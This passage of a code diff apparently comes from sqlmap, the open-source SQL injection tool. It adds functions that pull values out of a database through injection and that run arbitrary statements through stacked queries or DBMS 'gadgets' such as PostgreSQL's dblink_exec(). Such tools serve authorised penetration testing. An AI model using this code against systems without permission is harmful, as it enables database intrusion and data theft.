+                    value = _goBooleanProxy(booleanExpression)
+                else:
+                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)
+        else:
+            errMsg = "none of the injection types identified can be "
+            errMsg += "leveraged to retrieve queries output"
+            raise SqlmapNotVulnerableException(errMsg)
+
+    finally:
+        kb.resumeValues = True
+        kb.responseTimeMode = None
+
+        conf.tbl = popValue()
+        conf.db = popValue()
+
+        if suppressOutput is not None:
+            getCurrentThreadData().disableStdOut = popValue()
+
+    kb.safeCharEncode = False
+
+    if not any((kb.testMode, conf.dummy, conf.offline, conf.noCast, conf.hexConvert)) and value is None and Backend.getDbms() and conf.dbmsHandler and kb.fingerprinted:
+        if conf.abortOnEmpty:
+            errMsg = "aborting due to empty data retrieval"
+            logger.critical(errMsg)
+            raise SystemExit
+        else:
+            warnMsg = "in case of continuous data retrieval problems you are advised to try "
+            warnMsg += "a switch '--no-cast' "
+            warnMsg += "or switch '--hex'" if hasattr(queries[Backend.getIdentifiedDbms()], "hex") else ""
+            singleTimeWarnMessage(warnMsg)
+
+    # Dirty patch (MSSQL --binary-fields with 0x31003200...)
+    if Backend.isDbms(DBMS.MSSQL) and conf.binaryFields:
+        def _(value):
+            if isinstance(value, six.text_type):
+                if value.startswith(u"0x"):
+                    value = value[2:]
+                    if value and len(value) % 4 == 0:
+                        candidate = ""
+                        for i in xrange(len(value)):
+                            if i % 4 < 2:
+                                candidate += value[i]
+                            elif value[i] != '0':
+                                candidate = None
+                                break
+                        if candidate:
+                            value = candidate
+            return value
+
+        value = applyFunctionRecursively(value, _)
+
+    # Dirty patch (safe-encoded unicode characters)
+    if isinstance(value, six.text_type) and "\\x" in value:
+        try:
+            candidate = eval(repr(value).replace("\\\\x", "\\x").replace("u'", "'", 1)).decode(conf.encoding or UNICODE_ENCODING)
+            if "\\x" not in candidate:
+                value = candidate
+        except:
+            pass
+
+    return extractExpectedValue(value, expected)
+
+def getGadget():
+    """
+    Returns a 'gadget' (a side-effecting scalar expression usable through a
+    regular - e.g. boolean/time-based - injection) that can run an arbitrary
+    statement when stacked queries are not available (e.g. dblink_exec() on
+    PostgreSQL). Detection is done once and cached inside 'kb.gadget'.
+    """
+
+    if kb.gadget is None:
+        kb.gadget = False
+
+        dbms = Backend.getIdentifiedDbms()
+
+        if dbms is not None and "gadgets" in queries[dbms]:
+            for name, gadget in queries[dbms].gadgets.__dict__.items():
+                try:
+                    available = checkBooleanExpression(gadget.check)
+                except Exception:
+                    available = False
+
+                if available:
+                    infoMsg = "using '%s' gadget to run statement(s) as " % name
+                    infoMsg += "stacked queries are not available"
+                    logger.info(infoMsg)
+
+                    kb.gadget = gadget
+                    break
+
+    return kb.gadget or None
+
+def goStacked(expression, silent=False):
+    if PAYLOAD.TECHNIQUE.STACKED in kb.injection.data:
+        setTechnique(PAYLOAD.TECHNIQUE.STACKED)
+    else:
+        for technique in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True):
+            _ = getTechniqueData(technique)
+            if _ and "stacked" in _["title"].lower():
+                setTechnique(technique)
+                break
+
+    expression = cleanQuery(expression)
+
+    if conf.direct:
+        return direct(expression)
+
+    if PAYLOAD.TECHNIQUE.STACKED not in kb.injection.data:
+        gadget = getGadget()
+
+        if gadget:
+            warnMsg = "statement execution through a gadget is best-effort "
+            warnMsg += "and its result (if any) can not be retrieved"
+            singleTimeWarnMessage(warnMsg)
+
+            payload = getUnicode(gadget.command) % getUnicode(encodeHex(getBytes(expression), binary=False))
+            checkBooleanExpression("(%s) IS NOT NULL" % payload)
+            return
+
+    query = agent.prefixQuery(";%s" % expression)
+    query = agent.suffixQuery(query)
+    payload = agent.payload(newValue=query)
+    Request.queryPage(payload, content=False, silent=silent, noteResponseTime=False, timeBasedCompare="SELECT" in (payload or "").upper())
+
+def checkBooleanExpression(expression, expectingNone=True):
+    return getValue(expression, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, suppressOutput=True, expectingNone=expectingNone)
